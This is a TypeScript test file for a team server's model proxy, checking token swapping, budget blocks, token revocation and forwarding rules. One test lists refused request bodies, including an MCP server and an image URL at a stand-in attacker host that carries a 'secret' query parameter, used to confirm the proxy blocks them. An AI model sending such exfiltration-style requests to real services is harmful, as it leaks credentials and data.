import { setSetting } from '../../server/src/admin/settings'
import { SHARED_SUBSCRIPTIONS_KEY } from '../../server/src/credentials/policy'
import { afterAll, describe, expect, test } from 'bun:test'
import { makeEnv } from '../lib/env'
import { waitFor } from '../lib/wait'
import path from 'node:path'
import { checkProxyRequest, issueProxyToken, revokeProxyTokens, startModelProxy } from '../../server/src/proxy/model-proxy'
import { createBroker } from '../../server/src/credentials/broker'
import { addCred, testCredCtx } from '../lib/credentials'

const env = makeEnv('unit-proxy')
setSetting(env.db, SHARED_SUBSCRIPTIONS_KEY, true) // explicitly opt in for these shared-subscription proxy checks
const seen: { headers: Record<string, string>; body: string }[] = []
const upstream = Bun.serve({
  port: 0, hostname: '127.0.0.1',
  async fetch(req) {
    seen.push({ headers: Object.fromEntries(req.headers), body: await req.text() })
    const body = JSON.parse(seen[seen.length - 1].body || '{}')
    if (body.stream) {
      const sse = ['event: message_start', 'data: ' + JSON.stringify({ type: 'message_start', message: { model: 'claude-sonnet-x', usage: { input_tokens: 1000, cache_read_input_tokens: 2000, output_tokens: 1 } } }), '',
        'event: content_block_delta', 'data: ' + JSON.stringify({ type: 'content_block_delta', delta: { type: 'text_delta', text: 'hi' } }), '',
        'event: message_delta', 'data: ' + JSON.stringify({ type: 'message_delta', usage: { output_tokens: 500 } }), '', 'event: message_stop', 'data: {"type":"message_stop"}', '', ''].join('\n')
      return new Response(sse, { headers: { 'content-type': 'text/event-stream' } })
    }
    return Response.json({ id: 'm', model: 'claude-opus-x', content: [{ type: 'text', text: 'ok' }], usage: { input_tokens: 100, output_tokens: 10 } })
  },
})
const turnId = 'tp1'
env.db.query("INSERT INTO turns (id, chat_id, user_id, engine) VALUES (?, 'c', 'alice', 'claude-code')").run(turnId)
// the team's AI connections: an Anthropic API key and a Claude subscription token, each turn token bound to one
const { cc } = testCredCtx(env.db, path.join(env.fx.data, 'secrets'), { upstreams: { anthropic: `http://127.0.0.1:${upstream.port}` } })
const KEY_ID = addCred(cc, 'anthropic-api-key', 'sk-real-company-key')
const OAUTH_ID = addCred(cc, 'anthropic-oauth', 'sk-ant-oat-real-subscription')
const broker = createBroker(cc)
const key = await startModelProxy({ db: env.db, broker })
const oauth = key
afterAll(async () => { await key.stop(); upstream.stop(true) })
const bound = (credentialId: string, o: { budgetUsd?: number } = {}) => issueProxyToken(env.db, turnId, 'alice', { credentialId, family: 'anthropic', ...o })
const call = (base: string, h: Record<string, string>, body: unknown = { model: 'claude-opus-x', max_tokens: 5, messages: [] }) =>
  fetch(base + '/v1/messages', { method: 'POST', headers: { 'content-type': 'application/json', 'anthropic-version': '2023-06-01', ...h }, body: JSON.stringify(body) })

describe('model proxy', () => {
  const tok = bound(KEY_ID)
  const otok = bound(OAUTH_ID)
  test('rejects missing, empty and unknown tokens', async () => {
    expect((await call(key.url, {})).status).toBe(401)
    expect((await call(key.url, { authorization: 'Bearer ' })).status).toBe(401) // apiKeyHelper failure sends an empty Bearer
    expect((await call(key.url, { 'x-api-key': 'mpx_guess' })).status).toBe(401)
  })
  test('api-key upstream: swaps in the real key, never forwards the turn token', async () => {
    const r = await call(key.url, { 'x-api-key': tok })
    expect(r.status).toBe(200)
    const h = seen[seen.length - 1].headers
    expect(h['x-api-key']).toBe('sk-real-company-key'); expect(h.authorization).toBeUndefined()
    expect(JSON.stringify(h)).not.toContain(tok)
    const t = env.db.query('SELECT * FROM turns WHERE id = ?').get(turnId) as any
    // a model the price table does not know is priced at the family's most expensive row (credentials/prices.ts)
    expect(t.input_tokens).toBe(100); expect(t.output_tokens).toBe(10); expect(t.cost_usd).toBeCloseTo((100 * 10 + 10 * 50) / 1e6, 8)
    expect(t.credential_id).toBe(OAUTH_ID) // the turn keeps its latest attempt's connection
  })
  test('oauth upstream: Bearer from CLAUDE_CODE_OAUTH_TOKEN is swapped, beta header kept + oauth beta added', async () => {
    const r = await call(oauth.url, { authorization: 'Bearer ' + otok, 'anthropic-beta': 'fine-grained-tool-streaming-2025-05-14' })
    expect(r.status).toBe(200)
    const h = seen[seen.length - 1].headers
    expect(h.authorization).toBe('Bearer sk-ant-oat-real-subscription'); expect(h['x-api-key']).toBeUndefined()
    expect(h['anthropic-beta'].split(',')).toEqual(['fine-grained-tool-streaming-2025-05-14', 'oauth-2025-04-20'])
  })
  test('streams SSE through and counts usage from message_start/message_delta', async () => {
    const before = env.db.query('SELECT output_tokens FROM turns WHERE id = ?').get(turnId) as any
    const r = await call(key.url, { 'x-api-key': tok }, { model: 'claude-sonnet-x', stream: true, max_tokens: 5, messages: [] })
    const text = await r.text()
    expect(text).toContain('text_delta')
    // usage is written when the upstream stream ends, which can land just after the client finished reading
    const grew = await waitFor(() => (env.db.query('SELECT output_tokens FROM turns WHERE id = ?').get(turnId) as any).output_tokens - before.output_tokens === 500, { timeoutMs: 3000 })
    expect(grew).toBe(true)
  })
  test('budget block and per-turn cap: 403 budget_exceeded (not 429, which the SDK retries), nothing upstream', async () => {
    const n = seen.length
    env.db.query("INSERT INTO budgets (id, subject_type, subject_id, period, limit_usd, action) VALUES ('b1','user','alice','day', 0.000001, 'block')").run()
    let r = await call(key.url, { 'x-api-key': tok })
    expect(r.status).toBe(403)
    expect((await r.json()).error).toEqual({ type: 'permission_error', message: 'budget_exceeded' })
    env.db.query("DELETE FROM budgets").run()
    const capped = bound(KEY_ID, { budgetUsd: 0.000001 })
    r = await call(key.url, { 'x-api-key': capped })
    expect(r.status).toBe(403)
    expect(seen.length).toBe(n)
  })
  test('revoked token (turn ended) is refused', async () => {
    revokeProxyTokens(env.db, turnId)
    expect((await call(key.url, { 'x-api-key': tok })).status).toBe(401)
  })
  test('peer check can refuse callers outside the turn', async () => {
    const p = await startModelProxy({ db: env.db, broker, peerCheck: async () => false })
    env.db.query("INSERT INTO turns (id, chat_id, user_id, engine) VALUES ('tp2', 'c', 'alice', 'x')").run()
    expect((await call(p.url, { 'x-api-key': issueProxyToken(env.db, 'tp2', 'alice', { credentialId: KEY_ID, family: 'anthropic' }) })).status).toBe(403)
    await p.stop()
  })
  test('forwarding rules: only what Claude Code needs reaches the upstream with the real credential (design tab 7)', async () => {
    const tok2 = bound(KEY_ID)
    const n = seen.length
    const base = { model: 'claude-opus-5-5', max_tokens: 5, messages: [{ role: 'user', content: 'hi' }] }
    const refused: [string, unknown][] = [
      ['mcp connector', { ...base, mcp_servers: [{ type: 'url', url: 'https://attacker.example/mcp', name: 'x' }] }],
      ['code execution', { ...base, container: 'c1' }],
      ['web_fetch server tool', { ...base, tools: [{ type: 'web_fetch_20250910', name: 'web_fetch' }] }],
      ['code execution tool', { ...base, tools: [{ type: 'code_execution_20250825', name: 'code_execution' }] }],
      ['image from a URL', { ...base, messages: [{ role: 'user', content: [{ type: 'image', source: { type: 'url', url: 'https://attacker.example/?d=secret' } }] }] }],
      ['document from the files API', { ...base, messages: [{ role: 'user', content: [{ type: 'document', source: { type: 'file', file_id: 'f' } }] }] }],
      ['URL image inside a tool result', { ...base, messages: [{ role: 'user', content: [{ type: 'tool_result', tool_use_id: 't', content: [{ type: 'image', source: { type: 'url', url: 'https://a.example/x' } }] }] }] }],
      ['unknown block type', { ...base, messages: [{ role: 'user', content: [{ type: 'mcp_tool_use', id: 'x', name: 'n', server_name: 's', input: {} }] }] }],
      ['not a Claude model', { ...base, model: 'gpt-5' }],
    ]
    for (const [label, body] of refused) {
      const r = await call(key.url, { 'x-api-key': tok2 }, body)
      expect(r.status, label).toBe(403)
      expect((await r.json()).error.message, label).toContain('refused by the team server')
    }
    for (const p of ['/v1/files', '/v1/messages/batches', '/v1/models']) {
      const r = await fetch(key.url + p, { method: p === '/v1/models' ? 'GET' : 'POST', headers: { 'x-api-key': tok2, 'content-type': 'application/json' }, body: p === '/v1/models' ? undefined : '{}' })
      expect(r.status, p).toBe(403)
    }
    expect(seen.length).toBe(n) // nothing reached the upstream
    const a = env.db.query("SELECT COUNT(*) AS n FROM audit_log WHERE action = 'proxy.refused' AND target = ?").get(turnId) as { n: number }
    expect(a.n).toBe(refused.length + 3)
    // what Claude Code 2.1.305 sends (captured through a recording upstream): custom tools, the web_search server tool,
    // inline images and documents, tool results, thinking, cache_control, ?beta=true
    const ok = { ...base, system: [{ type: 'text', text: 's', cache_control: { type: 'ephemeral' } }], thinking: { type: 'enabled', budget_tokens: 1024 }, context_management: {}, output_config: {}, metadata: { user_id: 'u' },
      tools: [{ name: 'mcp__team__read', description: 'd', input_schema: { type: 'object' } }, { type: 'web_search_20250305', name: 'web_search', max_uses: 5 }],
      messages: [
        { role: 'user', content: [{ type: 'text', text: 'q' }, { type: 'image', source: { type: 'base64', media_type: 'image/png', data: 'AA==' } }, { type: 'document', source: { type: 'base64', media_type: 'application/pdf', data: 'AA==' } }] },
        { role: 'assistant', content: [{ type: 'thinking', thinking: 't', signature: 's' }, { type: 'tool_use', id: 'tu', name: 'mcp__team__read', input: { file_path: 'x' } }, { type: 'server_tool_use', id: 'st', name: 'web_search', input: { query: 'q' } }, { type: 'web_search_tool_result', tool_use_id: 'st', content: [{ type: 'web_search_result', url: 'https://x.example', title: 't', encrypted_content: 'e' }] }] },
        { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tu', content: [{ type: 'text', text: 'file' }] }] },
      ] }
    expect(checkProxyRequest('POST', new URL('http://p/v1/messages?beta=true'), ok)).toBeNull()
    expect(checkProxyRequest('POST', new URL('http://p/v1/messages/count_tokens?beta=true'), ok)).toBeNull()
    const r = await fetch(key.url + '/v1/messages?beta=true', { method: 'POST', headers: { 'x-api-key': tok2, 'content-type': 'application/json', 'anthropic-version': '2023-06-01' }, body: JSON.stringify(ok) })
    expect(r.status).toBe(200)
    expect(seen.length).toBe(n + 1)
  })
})
